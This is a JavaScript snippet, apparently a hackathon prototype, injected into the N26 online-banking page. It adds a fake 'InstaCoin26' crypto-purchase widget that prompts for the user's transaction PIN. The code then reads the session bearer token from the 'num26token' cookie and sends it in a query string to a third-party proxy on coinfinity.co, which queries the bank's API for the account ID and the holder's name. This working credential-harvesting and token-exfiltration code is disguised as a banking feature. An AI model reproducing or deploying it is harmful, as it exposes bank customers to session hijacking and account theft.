$('head').append('<style>.UIHeader__invite-friends {background: none;cursor: default;text-decoration: none;}.UIHeader__invite-friends:hover {cursor: pointer;text-decoration: none;}#ic26 {line-height: 24px;}.hidden {display: none;}.ic26-pin {width: 22px;margin: 0 0 0 5px;}.ic26-form a, .ic26-form a:hover, .ic26-form a:active, .ic26-form a:visited {color: white;}.ic26-form input, .ic26-form button {height: 23px;}.ic26-info, {text-decoration: underline;cursor: pointer;}</style>');

if (window.location.host != 'my.n26.com') {
    window.location.replace('https://my.n26.com');
}

var $invite = $('.UIHeader__invite-friends'),
    $accountInfo = $('.UIHeader__account-infos'),
    $InstaCoin26 = $('<div id="ic26" class="UIHeader__account-infos"><em>InstaCoin26:</em> <span class="ic26-info" title="Available: Bitcoin / Ether / Dash / Litecoin">Buy cryptocurrencies for € 5 instantly!</span> <span class="hidden ic26-form">Confirm with your <input class="ic26-pin" type="password" name="ic26-transaction-pin" placeholder="PIN" autocomplete="off" /> <button class="ic26-buy">Buy now for € 5</button></span></div>');

$invite.html($InstaCoin26).attr('href', '#ic26');
$invite.attr('href', '#ic26').on('click', function(e) {
    e.preventDefault();

    $('.ic26-form').removeClass('hidden');
    $('.ic26-info').addClass('hidden');

    $('.ic26-pin').focus();
});

$('.ic26-buy').on('click', function(e) {
    e.preventDefault();

    var cookiename = 'num26token',
        cookiestring = RegExp("" + cookiename + "[^;]+").exec(document.cookie),
        bearer = decodeURIComponent(!!cookiestring ? cookiestring.toString().replace(/^[^=]+./, "") : ""),
        pin = $('.ic26-pin').val(),
        api = "https://wad2018.coinfinity.co/InstaCoin26/api/proxy.php?token=" + bearer + "&url=https://api.tech26.de/api";

    $('.ic26-form').html('Processing request ...');

    $.ajax({
        type: 'GET',
        url: api + '/me?full=true',
        dataType: 'json',
        beforeSend: function(xhr) {
            xhr.setRequestHeader('Authorization', 'Basic ' + bearer);
        },
        success: function(data) {

            if (data.account && data.account.id) {
                alert('AccountID: ' + data.account.id + ' -- ' + data.userInfo.firstName + ' ' + data.userInfo.lastName);

                // screencast #hackWAD
                var redeemUrl = "https://www.bitcoinbon.at/index.en?c=no-real-code-no-payment-made";
                $('.ic26-form')
                    .html('<a href="' + redeemUrl + '">Transfer coins now to your wallet.</a>')
                    .on('click', function() {
                        window.location.replace(redeemUrl);
                    });

                // save data.userInfo for KYC reasons ...
                // do real transaction
            }
        },
        error: function(data) {
            alert('/me error');
        }
    });
});